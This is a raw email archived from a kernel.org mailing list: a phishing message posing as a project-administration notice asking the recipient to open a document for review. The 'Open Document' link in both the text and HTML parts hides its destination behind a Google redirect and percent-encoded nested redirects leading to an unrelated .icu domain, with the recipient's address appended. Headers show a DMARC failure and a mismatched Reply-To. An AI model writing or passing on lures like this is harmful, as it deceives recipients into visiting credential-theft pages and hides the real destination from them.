Return-Path: <SRS0=90Cp=F7=ap-south-1.amazonses.com=0109019fd870e5f1-0f631b03-f6f2-4a56-a93b-05e43fc85cd4-000000@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp.kernel.org (unknown [10.30.226.227])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id EBDABC5AC67
	for <linux-firmware@archiver.kernel.org>; Thu,  6 Aug 2026 18:58:29 +0000 (UTC)
Received: by smtp.kernel.org (Postfix)
	id C94FD1F00A3A; Thu,  6 Aug 2026 18:58:29 +0000 (UTC)
Authentication-Results: smtp.kernel.org; arc=none smtp.remote-ip=76.223.180.3
ARC-Seal: i=1; d=kernel.org; s=arc20260519; a=rsa-sha256; cv=none;
	t=1786042709;
	b=IryiiUp2W4Vxe/y4cxWk9XSMw0gvC9JnK87zaNVj4giYQICW2eqiR2sYaoHPbPu8o1g9
	 mUutdDrGzahRCQfyp2DLXVcxB+AWcFxhCFmpe3xQHEcT2r1AHlEpU3/NujXPU7sGN3YKU
	 c6a28QXp/LzxwW39+zyz48/KdLDbqQLmA1gA4Dgb6ro+DVCFuiT9fIrLq+DtfoyxWJcWw
	 cAs8xTuIBF2DUw5YgX97gzWsYOUogL0neBePob/lkzdOz+ZTTerFd1SZIfq/xRoxIiuta
	 6hmoO32Wgt5e3Z6DOB21iOyLRgwmr7j2GnjaBGYm8Yxg57b2yW70F/pTAnOXbnb6Lng==
ARC-Message-Signature: i=1; d=kernel.org; s=arc20260519; a=rsa-sha256;
	c=relaxed/relaxed; t=1786042709;
	h=DMARC-Filter:DKIM-Signature:DKIM-Signature:From:Subject:List-Id:To:
	 Content-Type:MIME-Version:Reply-To:Date:Message-ID:Feedback-ID:
	 X-SES-Outgoing;
	bh=jQ4I9lm/REpT4kZWfoBrOUBIMhOatQNmcxK9hQj5yRo=;
	b=CvEAe8bcjhFaop2TMvsK645jUgUl5gYd2aI5CZz24UqYdVtge/Z+wc0PpnlL2/zFAaPQ
	 HQuaJkRgiAiXqWel/xbuLdROeL/LUVwgzHCGlnQaGBJsuM3ft8MDeMDNGE+vKQyRjtnDK
	 ww+VfP+oyaTD4QFNOeNgngPslPZqelLm4lJ9iojR4/oRmCm2/sSO1aJXuP4XT1/yFbo5D
	 d+F2KS3rMJSR3MpODWzZmgvixoQQ3Gnx9vNYKgvcFVQb5RMEYzoUGrCtCZEDb7CbdMzOO
	 DGPBBBfNFL7DvGHM6xxG8DVSs3mVSRtG2dqLp4L1J1ouf99Qwul/WiYBHsYRRrENSQw==
ARC-Authentication-Results: i=1; smtp.kernel.org; dkim=pass header.d=8bit.ai header.i=@8bit.ai header.a=rsa-sha256 header.s=elpos2k54hqdxloq2lmwfvmjukikn56q header.b=NGF2NUf7;
	dkim=pass header.d=amazonses.com header.i=@amazonses.com header.a=rsa-sha256 header.s=rlntogby6xsxlfnvyxwnvvhttakdsqto header.b=JlWrCiVs;
	dmarc=fail header.from=8bit.ai;
	spf=pass smtp.mailfrom=ap-south-1.amazonses.com;
	arc=none smtp.remote-ip=76.223.180.3
Received: from c180-3.smtp-out.ap-south-1.amazonses.com (c180-3.smtp-out.ap-south-1.amazonses.com [76.223.180.3])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.kernel.org (Postfix) with ESMTPS id C26511F000E9
	for <linux-firmware@kernel.org>; Thu,  6 Aug 2026 18:58:27 +0000 (UTC)
Authentication-Results: smtp.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=8bit.ai header.i=@8bit.ai header.a=rsa-sha256 header.s=elpos2k54hqdxloq2lmwfvmjukikn56q header.b=NGF2NUf7;
	dkim=pass (1024-bit key, unprotected) header.d=amazonses.com header.i=@amazonses.com header.a=rsa-sha256 header.s=rlntogby6xsxlfnvyxwnvvhttakdsqto header.b=JlWrCiVs
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.kernel.org C26511F000E9
Authentication-Results: smtp.kernel.org; dmarc=fail (p=quarantine dis=none) header.from=8bit.ai
Authentication-Results: smtp.kernel.org; spf=pass smtp.mailfrom=ap-south-1.amazonses.com
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;
	s=elpos2k54hqdxloq2lmwfvmjukikn56q; d=8bit.ai; t=1786042705;
	h=From:Subject:To:Content-Type:MIME-Version:Reply-To:Date:Message-Id;
	bh=jQ4I9lm/REpT4kZWfoBrOUBIMhOatQNmcxK9hQj5yRo=;
	b=NGF2NUf7Lz1OYktR4lqJxqX/+mkaYMG9vUmUAf3HLzin5yZtV0QadYN3A3JsIdu2
	niMj2rsVVA+RH0pEw1UaPoe/5rfbXk7IMaSaOhZf9ZD2NH7qgdZ3dp4swWyp7DGWVqB
	Bta698MlvlElC+nnDFYdX+Xp5b0twvOArtrjcXoBjeujXPoCnIA84NYtapxLrLGs6KL
	2jmvSdGhTy6YY1Sok/vTbaLxqznHE7a8zgmrjtkApv5m+QfmKGFkj6oYI01pGUut2Y6
	XwU8461WNgcVj2lJbAPzsL5NXJDwmkDqY+yO8hf0kV/6fss+ekTQuji2LjXOwI/OamM
	SreJM9hDew==
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;
	s=rlntogby6xsxlfnvyxwnvvhttakdsqto; d=amazonses.com; t=1786042705;
	h=From:Subject:To:Content-Type:MIME-Version:Reply-To:Date:Message-Id:Feedback-ID;
	bh=jQ4I9lm/REpT4kZWfoBrOUBIMhOatQNmcxK9hQj5yRo=;
	b=JlWrCiVsFsbmLGVy6trGfEVNiVkJQHDcSbAzjlD6EWxEnHdjQvuC8xY4/f1x9fVR
	dFb+zcBKLg4JK1cHTMFJpl9sb9TdASaqcZr/QIgdTiVSnOjZeZeEWArl2L1f7lDxre8
	bmymJwsfYpoNSoU98BJW42qh9XhN+hTNJiePBt70=
From: Project Administration|kernel <noreply@8bit.ai>
Subject: Formal Notification Regarding the Availability of Project
 Documentation for Review and Internal Processing
List-Id: <linux-firmware.lore.kernel.org>
To: linux-firmware@kernel.org
Content-Type: multipart/alternative; boundary="tEPcwF5K1Rr61CGiXn4j411s4VnA62=_4A"
MIME-Version: 1.0
Reply-To: Documentcenter@mailer.com
Date: Thu, 6 Aug 2026 18:58:25 +0000
Message-ID: <0109019fd870e5f1-0f631b03-f6f2-4a56-a93b-05e43fc85cd4-000000@ap-south-1.amazonses.com>
Feedback-ID: ::1.ap-south-1.IgwfMTvz7nWT7bcAH9y6jHnjUix7OP3tMcmb6maFTRA=:AmazonSES
X-SES-Outgoing: 2026.08.06-76.223.180.3

This is a multi-part message in MIME format

--tEPcwF5K1Rr61CGiXn4j411s4VnA62=_4A
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable


Document Review Request

Review Required

Project Document Available for Review

Hello,

The project document has been prepared and is now ready for your revie=
w. Please open the document using the link below and provide your feed=
back or comments where necessary.

Open Document https://apis.google.com/additnow/l?applicationId=3D1&__l=
s=3Dogb&__lu=3D%68%74%74%70%73%3A%2F%2F%6C%2E%77%6C%2E%63%6F%2F%6C%3F%=
75%3D%68%74%74%70%73%25%33%41%25%32%46%25%32%46%66%75%72%69%6F%75%73%6=
6%6F%78%2E%69%63%75%25%32%46%45%4B%39%69%77%6F%56%32%30%4A%47%25%32%33=
linux-firmware@kernel.org

Your timely response will help ensure the project continues without de=
lay.

<p classble to access the document, please contact the project team.

Internal Communication

--tEPcwF5K1Rr61CGiXn4j411s4VnA62=_4A
Content-Type: text/html; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable


<!DOCTYPE html><html lang=3D"en"><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
8859-1">
<meta charset=3Diso-8859-1><meta http-equiv=3D"X-UA-Compatible" conten=
t=3D"IE=3Dedge"><title>Formal Notification Regarding the Availability =
of Project Documentation for Review and Internal Processing</title>
<style>body{margin:0;padding:0;background:#edf0f3;font-family:Arial,He=
lvetica,sans-serif;color:#2b2f33}.email-wrapper{width:100%;padding:40p=
x 20px;box-sizing:border-box}.card{max-width:620px;margin:0 auto;backg=
round:#fff;border-radius:6px;box-shadow:0 3px 12px rgba(0,0,0,.08);bor=
der-left:8px solid #0F4C81}.content{padding:34px 36px}.pretitle{font-s=
ize:12px;text-transform:uppercase;letter-spacing:1.4px;color:#0F4C81;f=
ont-weight:bold;margin-bottom:12px}h1{margin:0 0 18px;font-size:24px;l=
ine-height:1.3;color:#1f2933}p{margin:0 0 18px;font-size:15px;line-hei=
ght:1.7}.button-row{margin:28px 0 24px}.button{display:inline-block;ba=
ckground:#0F4C81;color:#fff;padding:13px 30px;text-decoration:none;bor=
der-radius:4px;font-size:14px;font-weight:bold}.button:hover{backgroun=
d:#0b395f}.note{padding-top:18px;border-top:1px solid #e1e5ea;font-siz=
e:13px;color:#667085}.footer{padding:16px 36px;background:#f7f9fb;bord=
er-top:1px solid #e1e5ea;font-size:12px;color:#7a828a;border-radius:0 =
0 6px 0}</style></head>
<body><div class=3D"email-wrapper"><div class=3D"card"><div class=3D"c=
ontent"><div class=3D"pretitle">Review Required</div><h1>Project Docum=
ent Available for Review</h1><p>Hello,</p><p>The project document has =
been prepared and is now ready for your review. Please open the docume=
nt using the link below and provide your feedback or comments where ne=
cessary.</p><div class=3D"button-row"><a href=3D"https://apis.google.c=
om/additnow/l?applicationId=3D1&__ls=3Dogb&__lu=3D%68%74%74%70%73%3A%2=
F%2F%6C%2E%77%6C%2E%63%6F%2F%6C%3F%75%3D%68%74%74%70%73%25%33%41%25%32=
%46%25%32%46%66%75%72%69%6F%75%73%66%6F%78%2E%69%63%75%25%32%46%45%4B%=
39%69%77%6F%56%32%30%4A%47%25%32%33linux-firmware@kernel.org" target=3D=
"_blank" rel=3D"noopener noreferrer" class=3D"button">Open Document</a=
></div><p>Your timely response will help ensure the project continues =
without delay.</p><p classble to access the document, please contact t=
he project team.</p></div><div class=3D"footer">Internal Communication=
</div></div></div>
</body>
</html>

--tEPcwF5K1Rr61CGiXn4j411s4VnA62=_4A--

